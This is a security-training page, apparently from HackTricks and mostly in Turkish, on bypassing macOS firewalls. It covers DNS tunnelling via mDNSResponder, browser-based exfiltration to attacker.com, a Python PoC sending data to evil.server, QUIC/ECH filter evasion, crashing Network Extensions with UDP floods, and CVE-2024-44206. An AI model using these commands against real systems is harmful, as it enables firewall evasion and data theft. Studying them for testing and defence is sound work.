# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Bulunan teknikler

Aşağıdaki tekniklerin bazı macOS firewall uygulamalarında çalıştığı görüldü.

### Whitelist adlarını kötüye kullanma

- Örneğin malware'i **`launchd`** gibi iyi bilinen macOS işlemlerinin adlarıyla çalıştırmak

### Synthetic Click

- Firewall kullanıcıdan izin isterse malware'in **allow** seçeneğine tıklamasını sağlamak

### **Apple signed binaries kullanma**

- **`curl`** gibi; ayrıca **`whois`** gibi diğer araçlar da kullanılabilir

### İyi bilinen Apple domain'leri

Firewall, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen Apple domain'lerine bağlantılara izin veriyor olabilir. Ayrıca iCloud, C2 olarak kullanılabilir.

### Generic Bypass

Firewall'ları bypass etmek için bazı fikirler

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak whitelist'e alınmış domain'leri veya bunlara erişmesine izin verilen uygulamaları belirlemenize yardımcı olur
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS'yi Kötüye Kullanma

macOS'ta bir process **DNS server** ile doğrudan iletişim kurmaz. İsim çözümleme, Apple tarafından imzalanmış bir system daemon olan **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) tarafından **XPC** üzerinden gerçekleştirilir; bu nedenle makinedeki her lookup, isteği yapan process yerine **`mDNSResponder`** kaynaklı trafik olarak host dışına çıkar. Firewall'lar bu daemon'a genellikle koşulsuz olarak güvenir — onu engellemek tüm sistemdeki isim çözümlemeyi bozardı.<sup>[[1]](#references)</sup>

Bu durum, firewall malware'in kendi socket'lerini engellese bile açık kalan bir kanal oluşturur:<sup>[[1]](#references)</sup>

1. Malware `evil.com` adresine bağlanmayı dener. **Kendisine** ait outbound connection firewall tarafından incelenir ve **engellenir**.
2. Malware bunun yerine XPC üzerinden `mDNSResponder`'dan `evil.com` adresini **resolve etmesini** ister.
3. Firewall ortaya çıkan query'yi inceler, kaynağın güvenilir ve Apple tarafından imzalanmış resolver olduğunu görür ve **izin verir**.
4. Query DNS server'a ulaşır — saldırgan `evil.com` için authoritative server'ı çalıştırıyorsa, exchange'in her iki ucunu da kontrol eder.

Saldırgan bu zone'a sahip olduğundan hiçbir "connection" gerekmez: veriler **sorgulanan label'ların** içinde (ör. `<encoded-chunk>.evil.com`) dışarı sızdırılır ve command'ler **answer record'larının** (TXT, A, CNAME…) içinde geri gönderilir; bu, tamamen whitelist'e alınmış bir process üzerinden gerçekleştirilen klasik DNS tunnelling'dir.

Herhangi bir unprivileged process daemon'u doğrudan kullanabilir; bu da yolun açık olduğunu doğrulamanın kolay bir yoludur:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Browser uygulamaları aracılığıyla

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Process injection yoluyla

Herhangi bir sunucuya bağlanmasına izin verilen bir process'e **code inject** edebiliyorsanız firewall korumalarını bypass edebilirsiniz:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Temmuz 2024'te Apple, Screen Time ebeveyn denetimleri tarafından kullanılan sistem genelindeki “Web content filter”ı devre dışı bırakan Safari/WebKit'teki kritik bir bug'ı patchledi.
Özel olarak hazırlanmış bir URI (örneğin, double URL-encoded “://” içeren) Screen Time ACL tarafından tanınmaz, ancak WebKit tarafından kabul edilir; bu nedenle request filtrelenmeden dışarı gönderilir. Böylece URL açabilen herhangi bir process (sandboxed veya unsigned code dahil), user ya da bir MDM profile tarafından açıkça engellenen domain'lere erişebilir.<sup>[[2]](#references)</sup>

Pratik test (patch uygulanmamış system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Erken macOS 14 “Sonoma” sürümlerindeki Packet Filter (PF) kural sıralama hatası
macOS 14 beta süreci sırasında Apple, **`pfctl`** etrafındaki userspace wrapper'da bir regresyon oluşturdu.
`quick` keyword'üyle eklenen kurallar (birçok VPN kill-switch tarafından kullanılır) sessizce yok sayılıyordu. Bu durum, VPN/firewall GUI'si *blocked* bildirse bile traffic leak'lerine neden oluyordu. Hata birkaç VPN vendor'ı tarafından doğrulandı ve RC 2'de (build 23A344) düzeltildi.

Hızlı leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple tarafından imzalanmış helper services'i kötüye kullanma (legacy – macOS 11.2 öncesi)
macOS 11.2'den önce **`ContentFilterExclusionList`**, **`nsurlsessiond`** ve App Store gibi yaklaşık 50 Apple binary'sinin Network Extension framework'üyle uygulanan tüm socket-filter firewall'larını (LuLu, Little Snitch vb.) bypass etmesine izin veriyordu.
Malware, yalnızca exclusion listesindeki bir process'i spawn edebilir veya bu process'e code inject edebilir ve kendi trafiğini zaten izin verilen socket üzerinden tünelleyebilirdi. Apple, macOS 11.2'de exclusion list'i tamamen kaldırdı, ancak technique hâlâ upgrade edilemeyen sistemlerde geçerlidir.<sup>[[3]](#references)</sup>

Örnek proof-of-concept (11.2 öncesi):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH ile Network Extension domain filtrelerini atlatma (macOS 12+)
NEFilter Packet/Data Providers, TLS ClientHello SNI/ALPN bilgilerini temel alır. **HTTP/3 over QUIC (UDP/443)** ve **Encrypted Client Hello (ECH)** ile SNI şifreli kalır, NetExt akışı ayrıştıramaz ve hostname kuralları çoğunlukla fail-open çalışır; bu da malware'in DNS'e dokunmadan engellenen domain'lere ulaşmasını sağlar.<sup>[[5]](#references)</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
QUIC/ECH hâlâ etkinse bu, hostname-filter için kolay bir bypass yoludur.

### macOS 15 “Sequoia” Network Extension kararsızlığı (2024–2025)
İlk 15.0/15.1 build'leri üçüncü taraf **Network Extension** filtrelerinin (LuLu, Little Snitch, Defender, SentinelOne vb.) çökmesine neden olur. Filtre yeniden başlatıldığında macOS flow rules'ları kaldırır ve birçok ürün fail-open davranır. Filtreyi binlerce kısa UDP flow ile flood'lamak (veya QUIC/ECH'yi zorlamak), çökmeyi tekrar tekrar tetikleyebilir ve GUI hâlâ firewall'ın çalıştığını gösterirken C2/exfil için bir pencere bırakabilir.<sup>[[4]](#references)</sup>

Hızlı yeniden üretim (güvenli lab makinesi):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Modern macOS için araç ipuçları

1. GUI firewall'ların oluşturduğu mevcut PF kurallarını inceleyin:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Halihazırda *outgoing-network* entitlement'ına sahip binary'leri listeleyin (piggy-backing için kullanışlıdır):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift kullanarak kendi Network Extension content filter'ınızı programatik olarak kaydedin.
Paketleri yerel bir socket'e ileten minimal bir rootless PoC, Patrick Wardle'ın **LuLu** source code'unda mevcuttur.

## References

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
